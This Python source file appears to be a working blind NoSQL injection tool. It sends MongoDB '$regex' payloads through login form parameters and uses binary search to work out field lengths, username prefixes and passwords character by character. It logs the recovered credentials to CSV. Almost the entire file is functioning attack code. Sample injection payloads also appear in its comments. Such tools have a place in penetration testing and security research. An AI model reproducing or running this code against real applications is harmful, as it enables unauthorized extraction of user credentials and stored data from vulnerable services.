from requests_html import HTMLSession
from termcolor import colored
import requests
import urllib3
import urllib
import time
from _helper import *

def query(nsi, form, dump = False):
    # data = {'username': 'admin', 'password[$regex]': q}
    # data = {"user": "admin", "pass": {"$regex": q}}
    # data = {
    #     'user[$regex]': q,
    #     'pass': 'abc123'
    # }
    # res = requests.post(r"http://172.28.48.1:3000/auth", data=data)
    if (nsi.reqMethod == '2'):
        r = requests.post(nsi.url, data=form, verify=False)
    else:
        r = requests.get(nsi.url, params=form, verify=False)
    
    if (dump == True):
        print(form)
    # print(nsi.successIdentifier)
    if nsi.successIdentifier in r.text:
        return True
    else:
        return False

total_time = []
def dumpKnownValue(nsi, form_data, password, v=1):
    # count length
    start_time_length = time.time()
    total_time_length = 0
    
    left = 1
    right = 100
    while right - left > 3: # <= 3 will stop
        guess = int(left+(right-left)/2)
        # print("def left:" + str(left))
        # print("def right:" + str(right))

        # print("mid:" + str(guess) + "| res " + str(query(query_s % guess)))
        Str.iterateParam(form_data, "^.{" + str(guess) + ",}$")
        # print(form_data)
        if query(nsi, form_data):
            left = guess
            # print("temp left: " + str(left)+ "\n=============\n")
        else:
            right = guess
            # print("temp right: " + str(right)+ "\n=============\n")
    # print("left:" + str(left))
    # print("right:" + str(right))
    length = 0
    for i in range(left,right): # do match
        # print(query_f % i)
        Str.iterateParam(form_data, "^.{"+str(i)+"}$")
        if query(nsi, form_data):
            if v == 1:
                end_time = time.time()
                time_taken = end_time - start_time_length
                length = i
                total_time_length += time_taken
    
    print(colored(f"Time taken length for {length}: {total_time_length}", "yellow", attrs=["blink"]))
    print("============================================\n")
    print(length)
    r = []
    for i in range(length):
        x = binarySearchContent(nsi, form_data, index=i,length=length)
        r.append(chr(x))
    print("Total Time: " + str(sum(total_time)))
    print('Password: '+ ''.join(r))
    # Log to CSV
    CsvWriter.writeCsv(nsi, ''.join(r), True)
    
    
def binarySearchContent(nsi, form_data, index=0, length=1, left=1, right=0x7f,):
    start_time = time.time()
    while right - left > 4:
        guess = int(left+(right-left)/2)

        old_left = left
        left = guess
        command = r"^.{%s}[\x{%s}-\x{%s}].{%s}" % (index, f"{hex(int(left))[2:]:0>4}", f"{hex(int(right))[2:]:0>4}", length-index-1)
        # print(command)
        Str.iterateParam(form_data, command)
        if query(nsi, form_data):
            left = guess
        else:
            right = guess
            left = old_left
        # print(f"{left} ~ {right}" , end="\r")
        # print(f"{left} ~ {right}")
        # time.sleep(5)
    
    for i in range(left,right+1):
        command = r"^.{%s}[\x{%s}].{%s}" % (index, f"{hex(int(i))[2:]:0>4}", length-index-1)
        # print(command)
        # time.sleep(2)
        Str.iterateParam(form_data, command)
        # print("2: "+str(form_data))
        if query(nsi, form_data):
            # print(command)
            end_time = time.time()
            time_taken = end_time - start_time
            total_time.append(time_taken)
            # print(total_time)
            # print(f"[!] Answer: {i} ({chr(i)})")
            if (not nsi.isSilent):
                print(colored(f"Time taken for append {chr(i)}: {time_taken}", "yellow", attrs=["blink"]))
            return i

def getPrefix(nsi, form_data):
    prefixUsernames = []
    alphabet = range(0x20, 0x7f)
    start_time = time.time()
    total_time = 0
    timesPrefix = []
    
    for c in alphabet:
        c = chr(c)
        if c not in ["*", "+", ".", "?", "|", "'", '"', "&", " ", '(', ')' , '^', '\\', '[', ']']:
            # for element in form_data:
            #     if "$regex" in element:
            #         form_data[element] = "^" + str(c) + ".*"
            Str.iterateParam(form_data, "^" + str(c) + ".*")
            r = requests.post(nsi.url, data=form_data, verify=False)
            if nsi.successIdentifier in r.text:
                end_time = time.time()
                time_taken = end_time - start_time
                total_time += time_taken
                prefixUsernames.append(c)
                timesPrefix.append({
                    c: time_taken
                })
                print(colored(f"Time taken for {c}: {time_taken}", "yellow", attrs=["blink"]))

    print(colored(f"Total time get username prefixes: {total_time}", "yellow", attrs=["blink"]))
    print(timesPrefix)
    
    n = 0
    for username in prefixUsernames:
        initLength = int(getDumpDataLength(nsi=nsi, username=username, form_data=form_data))
        # initLength = initLength+1
        print(initLength)
        dumpData(nsi=nsi, username=username, form_data=form_data, row=n, index=1, length=initLength)
        n += 1

dump_data = []
lens = []
def dumpData(nsi, username, form_data, row = 0, index = 1, length = 1, left = 1, right = 0x7f, found = []):
    res_chars = []
    letters_found = username
    # print('row:' + str(row))
    # print(found)
    # print("LEN : " + str(length))
    prev = ""
    if (len(found) != 0):
        # print(colored('EXTRACT NEXT ROW', "yellow", attrs=["blink"]))
        # print(username)
        sleft = 1
        sright = 0x7f
        # dump setelah row 1
        # get length
        lengthNextRow = getDumpDataLength(nsi, username, form_data, found)
        lens.append(lengthNextRow)
        total_time = 0
        for sindex in range(0, lengthNextRow+1):
            # print('xxx', sindex, + len(range(0, lengthNextRow+1)))
            start_time = time.time()
            # print(f'masuk bisect {sindex}' + str(sright - sleft > 4))
            
            regex_pattern = ""
            if (found != ''):
                for reg in found:
                    # regex_pattern += r'(?!.*\b%s\b)(?!.{%s}$)' % (reg, len(reg))
                    # regex_pattern += r'(?!.*%s)(?!.{%s}$)' % (reg, len(reg))
                    regex_pattern += r'(?!.*%s)' % (reg)
            # print('============NEXT ROW BRUTE LENGTH==============')
            
            while sright - sleft > 4:
                guess = int(sleft+(sright-sleft)/2)
                
                # print('NEXT ROW BRUTE INDEX TAHAP 1: ' + str(sindex))
                # # print("brute value 2: " + str(i))
                # print("NEXT ROW LENGTH 1: " + str(lengthNextRow))
                # print("NEXT ROW COUNT IDX TAHAP 1: " + str(lengthNextRow-sindex-1))

                old_left = sleft
                sleft = guess
                # command = r"^%s%s.{%s}[\x{%s}-\x{%s}].{%s}" % (username, regex_pattern, sindex, f"{hex(int(sleft))[2:]:0>4}", f"{hex(int(sright))[2:]:0>4}", lengthNextRow-sindex)
                
                # command = r"^%s.{%s}[\x{%s}-\x{%s}].{%s}" % (regex_pattern, sindex, f"{hex(int(sleft))[2:]:0>4}", f"{hex(int(sright))[2:]:0>4}", lengthNextRow-sindex)
                
                # command = r"^%s%s([\x{%s}-\x{%s}]).{%s}$" % (letters_found, regex_pattern, f"{hex(int(sleft))[2:]:0>4}", f"{hex(int(sright))[2:]:0>4}", lengthNextRow-sindex-len(letters_found))
                command = r"^%s^%s([\x{%s}-\x{%s}])" % (regex_pattern, letters_found, f"{hex(int(sleft))[2:]:0>4}", f"{hex(int(sright))[2:]:0>4}")
                Str.iterateParam(form_data, command)
                
                if query(nsi, form_data):
                    # print('kiri' + str(guess))
                    # print("command kiri:" + command)
                    # print('cek index: '+ str(sindex))
                    # print('cek len: '+ str(lengthNextRow))
                    
                    left = guess
                else:
                    # print('kanan' + str(guess))
                    # print("command kanan:" + command)
                    sright = guess
                    sleft = old_left
                    
                # print(f"NEXT ROW: {left} ~ {right}" , end="\r")
                # print(f"NEXT ROW: {sleft} ~ {sright}")
                # time.sleep(5)
            # print('============ NEXT ROW BRUTE EXACT=============')
            # enumerasi dengan left dan right sudah diperkecil
            for i in range(sleft,sright+1):
                command = r"^%s^%s([\x{%s}])" % (regex_pattern, letters_found, f"{hex(int(i))[2:]:0>4}")
                Str.iterateParam(form_data, command)
                
                # print("BRUTE FORCE COMMAND 2: "+str(command))
                # print(command)
                # time.sleep(2)
                # if (str(command) == r"^(?!.*abcdefghijklm)^a([\x{006b}])"):
                #     print(query(nsi, form_data, True))
                #     time.sleep(4)
                #     break
                if query(nsi, form_data):
                    end_time = time.time()
                    time_taken = end_time - start_time
                    total_time += time_taken
                    # total_time.append(time_taken)
                    if (not nsi.isSilent):
                        print(colored(f"Time taken for append {chr(i)}: {time_taken}", "yellow", attrs=["blink"]))
                    # print("query ans : " + str(command))
                    # print(f"[!] Answer: {i} ({chr(i)})")
                    # print(colored(f"[!] Answer: {i} ({chr(i)})", "green", attrs=["blink"]))
                    letters_found += chr(i) 
                    res_chars.append(chr(i))
                    sleft = 1
                    sright = 0x7f
                    break
            # if (prev != total_time and total_time != 0):
            #     print("Total Time:" + str(total_time))
            # prev = total_time
        
        letters_found = username+''.join(res_chars)
        if (letters_found == username):
            return
        found.append(letters_found)
        mergeFound = str(found[len(found) - 1])
        print(colored(f"Found: {mergeFound} Total Time: {total_time}", "green", attrs=["blink"]))
        # Log to CSV
        CsvWriter.writeCsv(nsi, mergeFound, True)
    else :
        # dump row 1
        ########### ini enumerasi rentang dri sebuah field untuk memperkecil pencarian ###########
        total_time = 0
        for index in range(1, length+1):
            start_time = time.time()
            # print(f'=== masuk bisect {index}: ' + str(right - left > 4) + "=======\n")
            # print(f'LEFT: {left} - RIGHT: {right}')

            # print('============BRUTE LENGTH==============')
            
            while right - left > 4:
                guess = int(left+(right-left)/2)
                old_left = left
                left = guess
                # command = r"^%s.{%s}[\x{%s}-\x{%s}].{%s}" % (username, index, f"{hex(int(left))[2:]:0>4}", f"{hex(int(right))[2:]:0>4}", length-index-1)
                command = r"^%s([\x{%s}-\x{%s}]).{%s}$" % (letters_found, f"{hex(int(left))[2:]:0>4}", f"{hex(int(right))[2:]:0>4}", length-index)
                # print("command: " + str(command))
                # print("1: "+str(command))
                # print(query(command, True))
                Str.iterateParam(form_data, command)
                if query(nsi, form_data):
                    # print('KIRI LENGTH: ' + str(guess))
                    # print(command)
                    left = guess
                else:
                    # print('KANAN LENGTH: ' + str(guess))
                    # print(command)
                    right = guess
                    left = old_left
                    
                print(f"{left} ~ {right}" , end="\r")
                # print(f"{left} ~ {right}")
                # time.sleep(5)
            
            # enumerasi dengan left dan right sudah diperkecil
            for i in range(left,right+1):
                # command = r"^%s.{%s}[\x{%s}].{%s}" % (username, index-1, f"{hex(int(i))[2:]:0>4}", length-index+1)
                command = r"^%s([\x{%s}]).{%s}$" % (letters_found, f"{hex(int(i))[2:]:0>4}", length-index)
                Str.iterateParam(form_data, command)
                
                if query(nsi, form_data):
                    end_time = time.time()
                    time_taken = end_time - start_time
                    total_time += time_taken
                    # total_time.append(time_taken)
                    
                    # print(colored(f"[!] Answer: {i} ({chr(i)})", "green", attrs=["blink"]))
                    if (not nsi.isSilent):
                        print(colored(f"Time taken for append {chr(i)}: {time_taken}", "yellow", attrs=["blink"]))
                    letters_found += chr(i)
                    res_chars.append(chr(i))
                    left = 1
                    right = 0x7f
                    break
                    # print("NEW LEFT " + str(left))
                    # print("NEW RIGHT " + str(right))
                    # return i
            # print("Total Time:" + str(total_time))
        found.append(letters_found)
        mergeFound = "".join(found)
        print(colored(f"Found: { mergeFound } - Total Time: {total_time}", "green", attrs=["blink"]))
        
        # Log to CSV
        CsvWriter.writeCsv(nsi, mergeFound, True)
        
    # print(found)
    # time.sleep(5)
    dumpData(nsi, username, form_data=form_data, row=row, index=1, length=1, left=1, right=0x7f, found=found)

def getDumpDataLength(nsi, username, form_data, found = ""):
    left = 1
    right = 100
    v = 1
    
    start_time_length = time.time()
    total_time_length = 0
    
    regex_pattern = ""
    if (found != ''):
        for reg in found:
            # regex_pattern += r'(?!.*%s)(?!.{%s}$)' % (reg, len(reg))
            regex_pattern += r'(?!.*%s)' % (reg)
    # print("PATTERN: " + str(regex_pattern))
    
    while right - left > 3: # <= 3 will stop
        guess = int(left+(right-left)/2)
    
        if (found == ""):
            regex = r"^%s.{%s,}$" % (username, guess)
        else:
            regex = r"^%s^%s.{%s,}.*" % (regex_pattern, username, guess)
            # print('regex:::: ' + str(regex))
            
        Str.iterateParam(form_data, regex)
        
        if query(nsi, form_data):
            left = guess
            # print("temp left: " + str(left)+ "\n=============\n")
        else:
            right = guess
    #         print("temp right: " + str(right)+ "\n=============\n")
    # print("left:" + str(left))
    # print("right:" + str(right))
    
    length = 0
    time_taken = 0
    for i in range(left,right+1): # do match

        Str.iterateParam(form_data, r"^%s^%s.{%s}$" % (regex_pattern, username, i))
        # print('BRUTE LENGTH::::' + str(i))
        # print('COMMAND BRUTE LENGTH::::' + str(r"^%s^%s.{%s}$" % (regex_pattern, username, i)))
        if query(nsi, form_data):
            if v == 1:
                end_time = time.time()
                time_taken = end_time - start_time_length
                total_time_length += time_taken
                
                length = i
                # if (not nsi.isSilent):
                #     print(colored(f"Time taken for append {i}: {time_taken}", "yellow", attrs=["blink"]))
                start_time_length = time.time()
                total_time_length = 0
                # break
    if (not nsi.isSilent):
        print(f'time taken length: {time_taken}')
    return length